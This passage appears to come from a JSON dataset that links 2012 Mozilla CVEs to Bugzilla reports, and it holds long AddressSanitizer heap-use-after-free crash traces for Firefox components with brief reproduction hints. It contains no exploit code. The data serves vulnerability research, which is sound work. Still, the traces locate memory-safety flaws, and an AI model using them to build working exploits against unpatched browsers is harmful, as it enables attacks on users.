0x1fe621e41078: fd fd fd fd fd fd fd fd 0x1fe621e41080: fa fa fa fa fa fa fa fa 0x1fe621e41088: fa fa fa fa fa fa fa fa 0x1fe621e41090: 00 00 00 fb fb fb fb fb Stats: 254M malloced (296M for red zones) by 516614 calls Stats: 42M realloced by 24355 calls Stats: 221M freed by 290089 calls Stats: 87M really freed by 207706 calls Stats: 484M (123993 full pages) mmaped in 121 calls mmaps by size class: 8:311277; 9:32764; 10:8190; 11:14329; 12:2048; 13:1536; 14:1280; 15:384; 16:1024; 17:1248; 18:144; 19:40; 20:28; mallocs by size class: 8:448277; 9:33777; 10:8842; 11:17027; 12:2365; 13:1758; 14:1483; 15:342; 16:1199; 17:1317; 18:159; 19:42; 20:26; frees by size class: 8:238380; 9:24927; 10:5659; 11:13922; 12:1543; 13:1467; 14:1292; 15:301; 16:1126; 17:1300; 18:110; 19:39; 20:23; rfrees by size class: 8:184498; 9:8844; 10:2132; 11:9156; 12:663; 13:494; 14:464; 15:181; 16:934; 17:311; 18:24; 19:4; 20:1; Stats: malloc large: 1544 small slow: 2450 ==19969== ABORTING"
      }
    ],
    "CVE-2012-4215": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=798677",
        "title": "Heap-use-after-free in nsPlaintextEditor::FireClipboardEvent",
        "description": "Reproduces on trunk. Need to press Middle Mouse Scroll button to reproduce this. ================================================================= ==22895== ERROR: AddressSanitizer heap-use-after-free on address 0x7f905c63cd87 at pc 0x7f9088a312aa bp 0x7fff42180070 sp 0x7fff42180068 READ of size 1 at 0x7f905c63cd87 thread T0 #0 0x7f9088a312a9 in nsPlaintextEditor::FireClipboardEvent(int) editor/libeditor/text/nsPlaintextEditor.cpp:1156 #1 0x7f9088f59036 in nsHTMLEditor::Paste(int) editor/libeditor/html/nsHTMLDataTransfer.cpp:1477 #2 0x7f9088b5dabf in nsEditorEventListener::MouseClick(nsIDOMEvent*) editor/libeditor/base/nsEditorEventListener.cpp:559 #3 0x7f90891ec73e in nsHTMLEditorEventListener::MouseClick(nsIDOMEvent*) editor/libeditor/html/nsHTMLEditorEventListener.cpp:244 #4 0x7f9088b57085 in nsEditorEventListener::HandleEvent(nsIDOMEvent*) editor/libeditor/base/nsEditorEventListener.cpp:316 #5 0x7f90866aad7b in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, nsIDOMEventListener*, nsIDOMEvent*, nsIDOMEventTarget*, unsigned int, nsCxPusher*) content/events/src/nsEventListenerManager.cpp:869 #6 0x7f90866ac4f8 in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) content/events/src/nsEventListenerManager.cpp:942 #7 0x7f908684304f in nsEventListenerManager::HandleEvent(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) content/events/src/nsEventListenerManager.h:143 #8 0x7f9086832bee in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, unsigned int, bool, nsCxPusher*) content/events/src/nsEventDispatcher.cpp:182 #9 0x7f90868301ad in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, unsigned int, nsDispatchingCallback*, bool, nsCxPusher*) content/events/src/nsEventDispatcher.cpp:283 #10 0x7f9086836e79 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<nsIDOMEventTarget>*) content/events/src/nsEventDispatcher.cpp:629 #11 0x7f908408f82c in PresShell::HandleEventInternal(nsEvent*, nsEventStatus*) layout/base/nsPresShell.cpp:6437 #12 0x7f9084090cf1 in PresShell::HandleEventWithTarget(nsEvent*, nsIFrame*, nsIContent*, nsEventStatus*) layout/base/nsPresShell.cpp:6223 #13 0x7f908671b9b2 in nsEventStateManager::CheckForAndDispatchClick(nsPresContext*, nsMouseEvent*, nsEventStatus*) content/events/src/nsEventStateManager.cpp:4526 #14 0x7f9086715020 in nsEventStateManager::PostHandleEvent(nsPresContext*, nsEvent*, nsIFrame*, nsEventStatus*) content/events/src/nsEventStateManager.cpp:3282 #15 0x7f90840900a9 in PresShell::HandleEventInternal(nsEvent*, nsEventStatus*) layout/base/nsPresShell.cpp:6462 #16 0x7f9084089ea3 in PresShell::HandlePositionedEvent(nsIFrame*, nsGUIEvent*, nsEventStatus*) layout/base/nsPresShell.cpp:6208 #17 0x7f9084081ed6 in PresShell::HandleEvent(nsIFrame*, nsGUIEvent*, bool, nsEventStatus*) layout/base/nsPresShell.cpp:6007 #18 0x7f90879f339c in nsViewManager::DispatchEvent(nsGUIEvent*, nsIView*, nsEventStatus*) view/src/nsViewManager.cpp:767 #19 0x7f90879def37 in nsView::HandleEvent(nsGUIEvent*, bool) view/src/nsView.cpp:1062 #20 0x7f90879df18d in non-virtual thunk to nsView::HandleEvent(nsGUIEvent*, bool) :? #21 0x7f908d14ce0a in nsWindow::DispatchEvent(nsGUIEvent*, nsEventStatus&) widget/gtk2/nsWindow.cpp:458 #22 0x7f908d1817a5 in nsWindow::OnButtonReleaseEvent(_GtkWidget*, _GdkEventButton*) widget/gtk2/nsWindow.cpp:2772 #23 0x7f908d197919 in button_release_event_cb(_GtkWidget*, _GdkEventButton*) widget/gtk2/nsWindow.cpp:5270 #24 0x7f907eafcdd7 in ?? ??:0 0x7f905c63cd87 is located 263 bytes inside of 824-byte region [0x7f905c63cc80,0x7f905c63cfb8) freed by thread T0 here: #0 0x4c3580 in __interceptor_free ??:? #1 0x7f909d419406 in moz_free memory/mozalloc/mozalloc.cpp:51 #2 0x7f9088f964dd in operator delete(void*) ../../../dist/include/mozilla/mozalloc.h:224 #3 0x7f9088a7e3c4 in nsEditor::Release() editor/libeditor/base/nsEditor.cpp:211 #4 0x7f9088f9e557 in nsHTMLEditor::Release() editor/libeditor/html/nsHTMLEditor.cpp:203 #5 0x7f90821c209b in ~nsCOMPtr_base ../../dist/include/nsCOMPtr.h:408 #6 0x7f9084234a69 in nsCOMPtr<nsIEditor>::~nsCOMPtr() ../../../dist/include/nsCOMPtr.h:447 #7 0x7f908421d006 in nsCOMPtr<nsIEditor>::~nsCOMPtr() ../../../dist/include/nsCOMPtr.h:447 #8 0x7f908c546887 in nsEditingSession::TearDownEditorOnWindow(nsIDOMWindow*) editor/composer/src/nsEditingSession.cpp:594 #9 0x7f90872a579a in nsHTMLDocument::TurnEditingOff() content/html/document/src/nsHTMLDocument.cpp:2588 #10 0x7f90872a6b95 in nsHTMLDocument::EditingStateChanged() content/html/document/src/nsHTMLDocument.cpp:2637 #11 0x7f90872cb56c in nsHTMLDocument::MaybeEditingStateChanged() content/html/document/src/nsHTMLDocument.cpp:2342 #12 0x7f90872cbd1d in nsHTMLDocument::EndUpdate(unsigned int) content/html/document/src/nsHTMLDocument.cpp:2355 #13 0x7f90844ce1d3 in ~mozAutoDocUpdate content/xul/templates/src/../../../base/src/mozAutoDocUpdate.h:35 #14 0x7f908449a6d6 in ~mozAutoDocUpdate content/xul/templates/src/../../../base/src/mozAutoDocUpdate.h:33 #15 0x7f90858d85f6 in nsDocument::ResetToURI(nsIURI*, nsILoadGroup*, nsIPrincipal*) content/base/src/nsDocument.cpp:2143 #16 0x7f9087297864 in nsHTMLDocument::ResetToURI(nsIURI*, nsILoadGroup*, nsIPrincipal*) content/html/document/src/nsHTMLDocument.cpp:285 #17 0x7f90858d70fa in nsDocument::Reset(nsIChannel*, nsILoadGroup*) content/base/src/nsDocument.cpp:2081 #18 0x7f908729737a in nsHTMLDocument::Reset(nsIChannel*, nsILoadGroup*) content/html/document/src/nsHTMLDocument.cpp:272 #19 0x7f90872b92d0 in nsHTMLDocument::Open(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, JSContext*, unsigned char, nsISupports**) content/html/document/src/nsHTMLDocument.cpp:1525 #20 0x7f90872bd0d1 in non-virtual thunk to nsHTMLDocument::Open(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, JSContext*, unsigned char, nsISupports**) :? #21 0x7f908f9244d3 in NS_InvokeByIndex_P xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #22 0x7f908aab6bf8 in CallMethodHelper::Invoke() js/xpconnect/src/XPCWrappedNative.cpp:3108 #23 0x7f908ab14fe9 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1469 #24 0x7f909604828f in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:364 #25 0x7f9095fea1bc in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) js/src/jsinterp.cpp:2461 #26 0x7f9095f35c1e in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) js/src/jsinterp.cpp:324 #27 0x7f9096048a80 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:378 #28 0x7f909589ab84 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) js/src/jsinterp.h:109 #29 0x7f909604ded0 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) js/src/jsinterp.cpp:411 previously allocated by thread T0 here: #0 0x4c3640 in malloc ??:? #1 0x7f909d41955a in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 #2 0x7f9083a71abe in operator new(unsigned long) ../../dist/include/mozilla/mozalloc.h:200 #3 0x7f908f4dd07b in mozilla::GenericFactory::CreateInstance(nsISupports*, nsID const&, void**) objdir-ff-asan-sym/xpcom/build/GenericFactory.cpp:16 #4 0x7f908f7bb5cc in nsComponentManagerImpl::CreateInstanceByContractID(char const*, nsISupports*, nsID const&, void**) xpcom/components/nsComponentManager.cpp:1006 #5 0x7f908f466df9 in CallCreateInstance(char const*, nsISupports*, nsID const&, void**) objdir-ff-asan-sym/xpcom/build/nsComponentManagerUtils.cpp:135 #6 0x7f908f4681cb in nsCreateInstanceByContractID::operator()(nsID const&, void**) const objdir-ff-asan-sym/xpcom/build/nsComponentManagerUtils.cpp:178 #7 0x7f908f45bb1c in nsCOMPtr_base::assign_from_helper(nsCOMPtr_helper const&, nsID const&) objdir-ff-asan-sym/xpcom/build/nsCOMPtr.cpp:110 #8 0x7f9086a39c6e in nsCOMPtr<nsIEditor>::operator=(nsCOMPtr_helper const&) ../../../dist/include/nsCOMPtr.h:689 #9 0x7f908c53f554 in nsEditingSession::SetupEditorOnWindow(nsIDOMWindow*) editor/composer/src/nsEditingSession.cpp:423 #10 0x7f908c536a00 in nsEditingSession::MakeWindowEditable(nsIDOMWindow*, char const*, bool, bool, bool) editor/composer/src/nsEditingSession.cpp:173 #11 0x7f90872a7d7b in nsHTMLDocument::EditingStateChanged() content/html/document/src/nsHTMLDocument.cpp:2696 #12 0x7f90872cb56c in nsHTMLDocument::MaybeEditingStateChanged() content/html/document/src/nsHTMLDocument.cpp:2342 #13 0x7f90872cbd1d in nsHTMLDocument::EndUpdate(unsigned int) content/html/document/src/nsHTMLDocument.cpp:2355 #14 0x7f9088e0983a in nsHtml5TreeOpExecutor::EndDocUpdate() parser/html/nsHtml5TreeOpExecutor.h:248 #15 0x7f9088e08e78 in nsHtml5TreeOpExecutor::DidBuildModel(bool) parser/html/nsHtml5TreeOpExecutor.cpp:131 #16 0x7f9088df6188 in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) parser/html/nsHtml5TreeOperation.cpp:639 #17 0x7f9088e0d435 in nsHtml5TreeOpExecutor::RunFlushLoop() parser/html/nsHtml5TreeOpExecutor.cpp:564 #18 0x7f9088e49b19 in nsHtml5ExecutorFlusher::Run() parser/html/nsHtml5StreamParser.cpp:127 #19 0x7f908f811440 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:612 #20 0x7f908f4a22bb in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #21 0x7f908de4d956 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #22 0x7f908faeaab1 in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:208 #23 0x7f908faea8e6 in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:201 #24 0x7f908faea7cb in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:175 Shadow byte and word: 0x1ff20b8c79b0: fd 0x1ff20b8c79b0: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ff20b8c7990: fd fd fd fd fd fd fd fd 0x1ff20b8c7998: fd fd fd fd fd fd fd fd 0x1ff20b8c79a0: fd fd fd fd fd fd fd fd 0x1ff20b8c79a8: fd fd fd fd fd fd fd fd =>0x1ff20b8c79b0: fd fd fd fd fd fd fd fd 0x1ff20b8c79b8: fd fd fd fd fd fd fd fd 0x1ff20b8c79c0: fd fd fd fd fd fd fd fd 0x1ff20b8c79c8: fd fd fd fd fd fd fd fd 0x1ff20b8c79d0: fd fd fd fd fd fd fd fd Stats: 250M malloced (292M for red zones) by 500781 calls Stats: 42M realloced by 23522 calls Stats: 222M freed by 274938 calls Stats: 88M really freed by 188351 calls Stats: 476M (121944 full pages) mmaped in 119 calls mmaps by size class: 8:294894; 9:32764; 10:8190; 11:14329; 12:2048; 13:1536; 14:1280; 15:256; 16:1152; 17:1280; 18:128; 19:40; 20:20; mallocs by size class: 8:434817; 9:32109; 10:8727; 11:16263; 12:2466; 13:1715; 14:1538; 15:314; 16:1299; 17:1322; 18:151; 19:40; 20:20; frees by size class: 8:225151; 9:23605; 10:5504; 11:13174; 12:1615; 13:1517; 14:1380; 15:265; 16:1236; 17:1305; 18:132; 19:37; 20:17; rfrees by size class: 8:165731; 9:8622; 10:2115; 11:8698; 12:626; 13:552; 14:481; 15:146; 16:1042; 17:308; 18:25; 19:4; 20:1; Stats: malloc large: 1533 small slow: 2447 ==22895== ABORTING"
      }
    ],
    "CVE-2012-4216": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=798853",
        "title": "Heap-use-after-free in gfxFont::GetFontEntry",
        "description": "Reproduces on trunk. Let the simple testcase run for like 2-5 min to see it crash automatically and reliably. ================================================================= ==6069== ERROR: AddressSanitizer heap-use-after-free on address 0x7fdcc8f3a498 at pc 0x7fdcf32ee33e bp 0x7fff3ac5bef0 sp 0x7fff3ac5bee8 READ of size 8 at 0x7fdcc8f3a498 thread T0 #0 0x7fdcf32ee33d in nsRefPtr<gfxFontEntry>::get() const ../../dist/include/nsAutoPtr.h:1003 #1 0x7fdcf3f01350 in gfxFont::GetFontEntry() ../../dist/include/gfxFont.h:1497 #2 0x7fdcfe894c4c in gfxFontCache::HashEntry::KeyEquals(gfxFontCache::Key const*) const gfx/thebes/gfxFont.cpp:1255 #3 0x7fdcfe948699 in nsTHashtable<gfxFontCache::HashEntry>::s_MatchEntry(PLDHashTable*, PLDHashEntryHdr const*, void const*) ../../dist/include/nsTHashtable.h:440 #4 0x7fdcfdf2e9da in SearchTable(PLDHashTable*, void const*, unsigned int, PLDHashOperator) objdir-ff-asan-sym/xpcom/build/pldhash.cpp:434 #5 0x7fdcfdf2b7c5 in PL_DHashTableOperate objdir-ff-asan-sym/xpcom/build/pldhash.cpp:587 #6 0x7fdcfe895d87 in nsTHashtable<gfxFontCache::HashEntry>::GetEntry(gfxFontCache::Key const&) const ../../dist/include/nsTHashtable.h:147 #7 0x7fdcfe897532 in gfxFontCache::DestroyFont(gfxFont*) gfx/thebes/gfxFont.cpp:1321 #8 0x7fdcfe8965da in gfxFontCache::NotifyExpired(gfxFont*) gfx/thebes/gfxFont.cpp:1314 #9 0x7fdcfe9470da in nsExpirationTracker<gfxFont, 3u>::AgeOneGeneration() ../../dist/include/nsExpirationTracker.h:188 #10 0x7fdcfe9466b3 in nsExpirationTracker<gfxFont, 3u>::TimerCallback(nsITimer*, void*) ../../dist/include/nsExpirationTracker.h:311 #11 0x7fdcfe2c6832 in nsTimerImpl::Fire() xpcom/threads/nsTimerImpl.cpp:473 #12 0x7fdcfe2c7d3a in nsTimerEvent::Run() xpcom/threads/nsTimerImpl.cpp:556 #13 0x7fdcfe28b440 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:612 #14 0x7fdcfdf1c2bb in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #15 0x7fdcfc8c7fbd in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:117 #16 0x7fdcfe564ab1 in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:208 #17 0x7fdcfe5648e6 in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:201 #18 0x7fdcfe5647cb in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:175 #19 0x7fdcfbd6c3ea in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #20 0x7fdcfa9a3df4 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:290 #21 0x7fdcf0c7823d in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3782 #22 0x7fdcf0c7e0b5 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3848 #23 0x7fdcf0c80f64 in XRE_main toolkit/xre/nsAppRunner.cpp:3923 #24 0x40baa3 in do_main(int, char**) browser/app/nsBrowserApp.cpp:174 #25 0x4091e5 in main browser/app/nsBrowserApp.cpp:279 #26 0x7fdd0f01b76c in ?? ??:0 0x7fdcc8f3a498 is located 24 bytes inside of 392-byte region [0x7fdcc8f3a480,0x7fdcc8f3a608) freed by thread T0 here: #0 0x4c3580 in __interceptor_free ??:? #1 0x7fdd0be93406 in moz_free memory/mozalloc/mozalloc.cpp:51 #2 0x7fdcfea9372d in operator delete(void*) ../../dist/include/mozilla/mozalloc.h:224 #3 0x7fdcfe897716 in gfxFontCache::DestroyFont(gfxFont*) gfx/thebes/gfxFont.cpp:1326 #4 0x7fdcfe8965da in gfxFontCache::NotifyExpired(gfxFont*) gfx/thebes/gfxFont.cpp:1314 #5 0x7fdcfe9470da in nsExpirationTracker<gfxFont, 3u>::AgeOneGeneration() ../../dist/include/nsExpirationTracker.h:188 #6 0x7fdcfe9466b3 in nsExpirationTracker<gfxFont, 3u>::TimerCallback(nsITimer*, void*) ../../dist/include/nsExpirationTracker.h:311 #7 0x7fdcfe2c6832 in nsTimerImpl::Fire() xpcom/threads/nsTimerImpl.cpp:473 #8 0x7fdcfe2c7d3a in nsTimerEvent::Run() xpcom/threads/nsTimerImpl.cpp:556 #9 0x7fdcfe28b440 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:612 #10 0x7fdcfdf1c2bb in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #11 0x7fdcfc8c7fbd in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:117 #12 0x7fdcfe564ab1 in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:208 #13 0x7fdcfe5648e6 in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:201 #14 0x7fdcfe5647cb in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:175 #15 0x7fdcfbd6c3ea in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #16 0x7fdcfa9a3df4 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:290 #17 0x7fdcf0c7823d in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3782 #18 0x7fdcf0c7e0b5 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3848 #19 0x7fdcf0c80f64 in XRE_main toolkit/xre/nsAppRunner.cpp:3923 #20 0x40baa3 in do_main(int, char**) browser/app/nsBrowserApp.cpp:174 #21 0x4091e5 in main browser/app/nsBrowserApp.cpp:279 #22 0x7fdd0f01b76c in ?? ??:0 previously allocated by thread T0 here: #0 0x4c3640 in malloc ??:? #1 0x7fdd0be9355a in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 #2 0x7fdcfea9b49c in operator new(unsigned long) ../../dist/include/mozilla/mozalloc.h:200 #3 0x7fdcfea8c6d0 in gfxFcFontSet::GetFontAt(unsigned int, gfxFontStyle const*) gfx/thebes/gfxPangoFonts.cpp:1203 #4 0x7fdcfea8b6d8 in gfxPangoFontGroup::GetBaseFontSet() gfx/thebes/gfxPangoFonts.cpp:2503 #5 0x7fdcfea8b038 in gfxPangoFontGroup::GetBaseFont() gfx/thebes/gfxPangoFonts.cpp:1936 #6 0x7fdcfea8ca32 in gfxPangoFontGroup::GetFontAt(int) gfx/thebes/gfxPangoFonts.cpp:1954 #7 0x7fdcf24ae390 in nsFontMetrics::GetMetrics() const gfx/src/nsFontMetrics.cpp:128 #8 0x7fdcf24af6fe in nsFontMetrics::ExternalLeading() gfx/src/nsFontMetrics.cpp:191 #9 0x7fdcf3017179 in GetNormalLineHeight(nsFontMetrics*) layout/generic/nsHTMLReflowState.cpp:2331 #10 0x7fdcf3015eef in ComputeLineHeight(nsStyleContext*, int, float) layout/generic/nsHTMLReflowState.cpp:2389 #11 0x7fdcf301521c in nsHTMLReflowState::CalcLineHeight(nsStyleContext*, int, float) layout/generic/nsHTMLReflowState.cpp:2411 #12 0x7fdcf3014f08 in nsHTMLReflowState::CalcLineHeight() const layout/generic/nsHTMLReflowState.cpp:2400 #13 0x7fdcf2db4b27 in nsBlockReflowState layout/generic/nsBlockReflowState.cpp:113 #14 0x7fdcf2d21d1c in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsBlockFrame.cpp:998 #15 0x7fdcf2dafdb0 in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) layout/generic/nsBlockReflowContext.cpp:268 #16 0x7fdcf2d53101 in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) layout/generic/nsBlockFrame.cpp:3090 #17 0x7fdcf2d47ee2 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) layout/generic/nsBlockFrame.cpp:2473 #18 0x7fdcf2d2f2e7 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) layout/generic/nsBlockFrame.cpp:1993 #19 0x7fdcf2d2259d in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsBlockFrame.cpp:1045 #20 0x7fdcf2dafdb0 in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) layout/generic/nsBlockReflowContext.cpp:268 #21 0x7fdcf2d53101 in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) layout/generic/nsBlockFrame.cpp:3090 #22 0x7fdcf2d47ee2 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) layout/generic/nsBlockFrame.cpp:2473 #23 0x7fdcf2d2f2e7 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) layout/generic/nsBlockFrame.cpp:1993 #24 0x7fdcf2d2259d in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsBlockFrame.cpp:1045 Shadow byte and word: 0x1ffb991e7493: fd 0x1ffb991e7490: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ffb991e7470: fa fa fa fa fa fa fa fa 0x1ffb991e7478: fa fa fa fa fa fa fa fa 0x1ffb991e7480: fa fa fa fa fa fa fa fa 0x1ffb991e7488: fa fa fa fa fa fa fa fa =>0x1ffb991e7490: fd fd fd fd fd fd fd fd 0x1ffb991e7498: fd fd fd fd fd fd fd fd 0x1ffb991e74a0: fd fd fd fd fd fd fd fd 0x1ffb991e74a8: fd fd fd fd fd fd fd fd 0x1ffb991e74b0: fd fd fd fd fd fd fd fd Stats: 252M malloced (278M for red zones) by 421919 calls Stats: 43M realloced by 24773 calls Stats: 228M freed by 300591 calls Stats: 96M really freed by 189262 calls Stats: 492M (126043 full pages) mmaped in 123 calls mmaps by size class: 8:294894; 9:32764; 10:12285; 11:14329; 12:3072; 13:1536; 14:1280; 15:256; 16:1152; 17:1280; 18:144; 19:40; 20:24; mallocs by size class: 8:351457; 9:34855; 10:9666; 11:16641; 12:2693; 13:1915; 14:1554; 15:317; 16:1289; 17:1310; 18:159; 19:41; 20:22; frees by size class: 8:246111; 9:26679; 10:6463; 11:13396; 12:1839; 13:1717; 14:1390; 15:267; 16:1233; 17:1294; 18:144; 19:39; 20:19; rfrees by size class: 8:165441; 9:9318; 10:2157; 11:8872; 12:662; 13:589; 14:588; 15:146; 16:1045; 17:414; 18:25; 19:4; 20:1; Stats: malloc large: 1532 small slow: 2354 ==6069== ABORTING"
      }
    ],
    "CVE-2012-4217": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=802902",
        "title": "Heap-use-after-free in nsViewManager::ProcessPendingUpdates",
        "description": "Reproduces on trunk. ================================================================= ==12412== ERROR: AddressSanitizer heap-use-after-free on address 0x7fdd01d75fa8 at pc 0x7fdd18f484cc bp 0x7fffb2f66e10 sp 0x7fffb2f66e08 READ of size 8 at 0x7fdd01d75fa8 thread T0 #0 0x7fdd18f484cb in nsViewManager::ProcessPendingUpdates() view/src/nsViewManager.cpp:1212 #1 0x7fdd1ae3e36b in nsTimerImpl::Fire() xpcom/threads/nsTimerImpl.cpp:475 #2 0x7fdd1ae3e9d6 in nsTimerEvent::Run() xpcom/threads/nsTimerImpl.cpp:555 #3 0x7fdd1ad6baf3 in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:220 #4 0x7fdd1a92b6b0 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #5 0x7fdd1aec3bdb in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:215 #6 0x7fdd1a624ebd in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #7 0x7fdd17891a44 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3858 #8 0x7fdd17892b1a in XRE_main toolkit/xre/nsAppRunner.cpp:3933 #9 0x408d75 in do_main(int, char**) browser/app/nsBrowserApp.cpp:174 #10 0x7fdd219e876c in __libc_start_main /build/buildd/eglibc-2.15/csu/libc-start.c:226 0x7fdd01d75fa8 is located 40 bytes inside of 64-byte region [0x7fdd01d75f80,0x7fdd01d75fc0) freed by thread T0 here: #0 0x432e00 in free #1 0x7fdd18f3ebac in nsViewManager::Release() view/src/nsViewManager.cpp:125 #2 0x7fdd19eaf9d8 in nsDocShell::Destroy() docshell/base/nsDocShell.cpp:4897 #3 0x7fdd19eaff5c in non-virtual thunk to nsDocShell::Destroy() :0 #4 0x7fdd1a06e13d in nsWebShellWindow::Destroy() xpfe/appshell/src/nsWebShellWindow.cpp:750 #5 0x7fdd18ff4fec in nsGlobalWindow::ReallyCloseWindow() dom/base/nsGlobalWindow.cpp:6734 #6 0x7fdd18ff433f in nsGlobalWindow::FinalClose() dom/base/nsGlobalWindow.cpp:6681 #7 0x7fdd18ff3ca2 in nsGlobalWindow::Close() dom/base/nsGlobalWindow.cpp:6624 #8 0x7fdd18ff3811 in nsGlobalWindow::Close() dom/base/nsGlobalWindow.cpp:6559 #9 0x7fdd1ae734a9 in NS_InvokeByIndex_P xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #10 0x7fdd19bee7c9 in CallMethodHelper::Invoke() js/xpconnect/src/XPCWrappedNative.cpp:3108 #11 0x7fdd19c02dc8 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1488 #12 0x7fdd1c0e3148 in JSFunction::native() const js/src/jscntxtinlines.h:364 #13 0x7fdd1c0e40b7 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) js/src/jsinterp.h:109 #14 0x7fdd1c1c8527 in js::IndirectProxyHandler::call(JSContext*, JSObject*, unsigned int, JS::Value*) js/src/jsproxy.cpp:450 #15 0x7fdd1c32730d in js::DirectWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) js/src/jswrapper.cpp:390 #16 0x7fdd1c327639 in non-virtual thunk to js::CrossCompartmentWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) #17 0x7fdd1c0e3289 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:364 #18 0x7fdd1c0d30d9 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) js/src/jsinterp.cpp:2370 #19 0x7fdd1c0bdf33 in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) js/src/jsinterp.cpp:324 #20 0x7fdd1c0e3038 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:378 #21 0x7fdd1c040be0 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) 